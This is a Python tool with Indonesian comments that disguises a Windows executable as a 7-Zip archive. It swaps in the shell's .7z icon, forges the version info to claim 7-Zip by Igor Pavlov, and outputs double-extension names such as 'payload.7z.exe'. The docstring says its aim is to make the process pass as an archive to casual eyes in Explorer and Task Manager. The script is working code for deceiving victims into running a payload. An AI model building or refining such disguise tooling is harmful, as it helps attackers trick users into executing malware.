"""tools/disguise.py — bikin exe tampil seperti arsip 7z di Explorer & Task Manager.

Yang diubah, semuanya lewat Resource Hacker:

  1. ICONGROUP,1  -> ikon tipe file .7z yang diambil dari Windows sendiri,
                     jadi persis ikon yang dipakai Explorer untuk payload.7z
  2. VERSIONINFO  -> ProductName "7-Zip", FileDescription "7-Zip Archive",
                     OriginalFilename "payload.7z.exe"

Kenapa harus hapus dulu baru tambah: `addoverwrite` pada VERSIONINFO cuma
MENAMBAH blok kedua di samping blok asli, dan Windows membaca blok pertama.
Urutan yang benar: delete VERSIONINFO, -> addoverwrite dari .res hasil rc.exe.

Batas jujurnya: Task Manager tetap menampilkan prosesnya. Yang berubah cuma
nama, ikon, dan deskripsi yang dia baca dari version info — cukup untuk
membuatnya terbaca sebagai entri arsip oleh mata yang lewat, bukan untuk
menghilangkannya dari daftar. Menghilang dari Task Manager butuh driver
kernel, dan itu proyek lain dengan harga lain.

Pakai:
    python tools\\disguise.py --exe dist\\SysUpdate.exe --out dist\\payload.7z.exe
    python tools\\disguise.py --exe dist\\SysUpdate.exe --icon 7z.ico --name backup.7z
"""

import argparse
import ctypes
import os
import shutil
import subprocess
import sys
import tempfile

RH_CANDIDATES = [
    r"D:\Buat rusuh\Kilo\Tools\Resource Hacker\ResourceHacker.exe",
    r"C:\Program Files\Resource Hacker\ResourceHacker.exe",
    r"C:\Program Files (x86)\Resource Hacker\ResourceHacker.exe",
    r"C:\Program Files\ResourceHacker\ResourceHacker.exe",
]

SEVENZIP = [r"C:\Program Files\7-Zip\7z.exe",
            r"C:\Program Files (x86)\7-Zip\7z.exe"]

DEFAULT_META = {
    "CompanyName": "Igor Pavlov",
    "FileDescription": "7-Zip Archive",
    "FileVersion": "24.09",
    "InternalName": "payload.7z",
    "LegalCopyright": "Copyright (C) 1999-2025 Igor Pavlov",
    "OriginalFilename": "payload.7z.exe",
    "ProductName": "7-Zip",
    "ProductVersion": "24.09",
}

RC_TEMPLATE = """1 VERSIONINFO
FILEVERSION {v4}
PRODUCTVERSION {v4}
FILEFLAGSMASK 0x3fL
FILEFLAGS 0x0L
FILEOS 0x40004L
FILETYPE 0x1L
FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
{values}
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
"""


def find_rh(explicit=""):
    if explicit:
        return explicit if os.path.isfile(explicit) else None
    for path in RH_CANDIDATES:
        if os.path.isfile(path):
            return path
    return None


def find_rc():
    """rc.exe dari Windows SDK. Resource Hacker butuh .res, bukan .rc mentah."""
    roots = [r"C:\Program Files (x86)\Windows Kits\10\bin",
             r"C:\Program Files\Windows Kits\10\bin"]
    best = None
    for root in roots:
        if not os.path.isdir(root):
            continue
        for name in sorted(os.listdir(root), reverse=True):
            exe = os.path.join(root, name, "x64", "rc.exe")
            if os.path.isfile(exe):
                return exe
            if best is None and os.path.isdir(os.path.join(root, name)):
                best = name
    return None


def run_hidden(cmd, timeout=90):
    """Resource Hacker adalah app GUI: tanpa -log dia bisa menggantung."""
    p = subprocess.run(cmd, capture_output=True, timeout=timeout,
                       creationflags=0x08000000)
    return p.returncode


def rh_action(rh, open_path, save_path, action, res=None, mask=None, log=None):
    cmd = [rh, "-open", open_path, "-save", save_path, "-action", action]
    if res:
        cmd += ["-res", res]
    if mask:
        # Tanpa tanda kutip. Kalau di-quote, Resource Hacker membaca seluruh
        # "ICONGROUP,1," sebagai satu nama dan menolak dengan
        # "resource mask is invalid with no valid resource name specified".
        cmd += ["-mask", mask]
    if log:
        cmd += ["-log", log]
    return run_hidden(cmd)


def read_log(path):
    """Log RH ditulis UTF-16LE. Baris yang berguna cuma Error/Success/Added."""
    try:
        raw = open(path, "rb").read()
    except OSError:
        return ""
    try:
        text = raw.decode("utf-16-le", "replace")
    except Exception:
        text = raw.decode("latin-1", "replace")
    keep = [ln.strip() for ln in text.splitlines()
            if ln.strip().startswith(("Error", "Success", "Added", "Deleted",
                                      "Replaced", "Extracted"))]
    return " | ".join(keep)


def shell_icon_for(ext, workdir):
    """Ikon tipe file dari Windows: bikin file contoh, lalu ambil ikonnya.

    Ikon .7z bukan milik shell32 — dia didaftarkan 7-Zip lewat shell extension,
    jadi satu-satunya cara mendapat yang persis adalah bertanya ke shell.
    """
    sample = os.path.join(workdir, "sample" + ext)
    seed = os.path.join(workdir, "seed.txt")
    with open(seed, "w") as fh:
        fh.write("x")

    seven = next((p for p in SEVENZIP if os.path.isfile(p)), None)
    if ext.lower() == ".7z" and seven:
        run_hidden([seven, "a", sample, seed, "-y"])
    elif ext.lower() == ".zip":
        import zipfile
        with zipfile.ZipFile(sample, "w") as zf:
            zf.write(seed, "seed.txt")
    else:
        shutil.copy2(seed, sample)

    if not os.path.isfile(sample):
        return None

    png = os.path.join(workdir, "shell.png")
    ps = ("Add-Type -AssemblyName System.Drawing; "
          "$i=[System.Drawing.Icon]::ExtractAssociatedIcon('%s'); "
          "$i.ToBitmap().Save('%s',[System.Drawing.Imaging.ImageFormat]::Png)"
          % (sample.replace("'", "''"), png.replace("'", "''")))
    run_hidden(["powershell.exe", "-NoProfile", "-Command", ps])
    return png if os.path.isfile(png) else None


def make_ico(png, ico_path):
    from PIL import Image
    img = Image.open(png).convert("RGBA")
    side = max(img.size)
    canvas = Image.new("RGBA", (side, side), (0, 0, 0, 0))
    canvas.paste(img, ((side - img.width) // 2, (side - img.height) // 2))
    canvas.save(ico_path, sizes=[(16, 16), (24, 24), (32, 32), (48, 48),
                                 (64, 64), (128, 128), (256, 256)])
    return ico_path


def build_rc(meta, res_path, rc_path, version4="24,9,0,0"):
    values = "\n".join('            VALUE "%s", "%s"' % (k, v)
                       for k, v in meta.items())
    text = RC_TEMPLATE.format(v4=version4, values=values)
    with open(rc_path, "w", encoding="utf-8", newline="\r\n") as fh:
        fh.write(text)

    rc_exe = find_rc()
    if not rc_exe:
        raise RuntimeError("rc.exe dari Windows SDK tidak ketemu")
    run_hidden([rc_exe, "/nologo", "/fo", res_path, rc_path])
    if not os.path.isfile(res_path):
        raise RuntimeError("rc.exe gagal, .res tidak terbentuk")
    return res_path


def pe_version_strings(path):
    """Baca version info lewat API Windows, bukan lewat cache shell."""
    k32 = ctypes.WinDLL("version", use_last_error=True)
    size = k32.GetFileVersionInfoSizeW(path, None)
    if not size:
        return {}
    buf = ctypes.create_string_buffer(size)
    if not k32.GetFileVersionInfoW(path, 0, size, buf):
        return {}
    out = {}
    ptr = ctypes.c_void_p()
    length = ctypes.c_uint()
    for key in ("FileDescription", "CompanyName", "ProductName",
                "OriginalFilename", "FileVersion"):
        sub = "\\StringFileInfo\\040904b0\\" + key
        if k32.VerQueryValueW(buf, sub, ctypes.byref(ptr), ctypes.byref(length)):
            out[key] = ctypes.wstring_at(ptr.value, length.value).rstrip("\x00")
    return out


def extract_icon(rh, exe, out_ico, log):
    if os.path.exists(out_ico):
        os.remove(out_ico)
    rh_action(rh, exe, out_ico, "extract", mask="ICONGROUP,1,", log=log)
    return os.path.isfile(out_ico)


def disguise(exe, out, icon_ico, meta, rh):
    work = tempfile.mkdtemp(prefix="disg_")
    try:
        src = exe
        if not icon_ico:
            png = shell_icon_for(".7z", work)
            if not png:
                raise RuntimeError("ikon .7z tidak bisa diambil dari shell")
            icon_ico = make_ico(png, os.path.join(work, "type.ico"))

        res = build_rc(meta, os.path.join(work, "ver.res"),
                       os.path.join(work, "ver.rc"))

        step1 = os.path.join(work, "s1.exe")
        log1 = os.path.join(work, "s1.log")
        rh_action(rh, src, step1, "delete", mask="VERSIONINFO,", log=log1)
        if not os.path.isfile(step1):
            raise RuntimeError("gagal hapus VERSIONINFO: " + read_log(log1))

        step2 = os.path.join(work, "s2.exe")
        log2 = os.path.join(work, "s2.log")
        rh_action(rh, step1, step2, "addoverwrite", res=res,
                  mask="VERSIONINFO,1,", log=log2)
        if not os.path.isfile(step2):
            raise RuntimeError("gagal tambah VERSIONINFO: " + read_log(log2))

        step3 = os.path.join(work, "s3.exe")
        log3 = os.path.join(work, "s3.log")
        rh_action(rh, step2, step3, "addoverwrite", res=icon_ico,
                  mask="ICONGROUP,1,", log=log3)
        if not os.path.isfile(step3):
            raise RuntimeError("gagal ganti ikon: " + read_log(log3))

        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        shutil.copy2(step3, out)

        check_ico = os.path.join(work, "check.ico")
        got_icon = extract_icon(rh, out, check_ico, os.path.join(work, "c.log"))
        icon_match = False
        if got_icon:
            from PIL import Image, ImageChops
            a = Image.open(icon_ico).convert("RGBA")
            b = Image.open(check_ico).convert("RGBA")
            a = a.resize(b.size)
            icon_match = ImageChops.difference(a, b).getbbox() is None

        return {
            "exe": out,
            "size": os.path.getsize(out),
            "icon_match": icon_match,
            "version": pe_version_strings(out),
        }
    finally:
        shutil.rmtree(work, ignore_errors=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--exe", required=True)
    ap.add_argument("--out", default="")
    ap.add_argument("--icon", default="", help="pakai .ico sendiri")
    ap.add_argument("--name", default="payload.7z", help="nama tampilan")
    ap.add_argument("--rh", default="")
    args = ap.parse_args()

    if not os.path.isfile(args.exe):
        print("[!] exe tidak ada: %s" % args.exe)
        return 1
    rh = find_rh(args.rh)
    if not rh:
        print("[!] Resource Hacker tidak ketemu, isi lewat --rh")
        return 1

    meta = dict(DEFAULT_META)
    meta["OriginalFilename"] = args.name + ".exe"
    meta["InternalName"] = args.name

    out = args.out or (os.path.splitext(os.path.abspath(args.exe))[0]
                       + "." + args.name.split(".")[-1] + ".exe")
    res = disguise(args.exe, out, args.icon, meta, rh)

    print("[*] rh      : %s" % rh)
    print("[*] output  : %s (%.2f MB)" % (res["exe"], res["size"] / 1048576.0))
    print("[*] ikon    : %s"
          % ("identik dengan ikon .7z" if res["icon_match"] else "TIDAK COCOK"))
    print("[*] version :")
    for key in ("FileDescription", "ProductName", "CompanyName",
                "OriginalFilename", "FileVersion"):
        print("    %-18s %s" % (key + ":", res["version"].get(key, "-")))
    return 0 if res["icon_match"] else 2


if __name__ == "__main__":
    sys.exit(main())
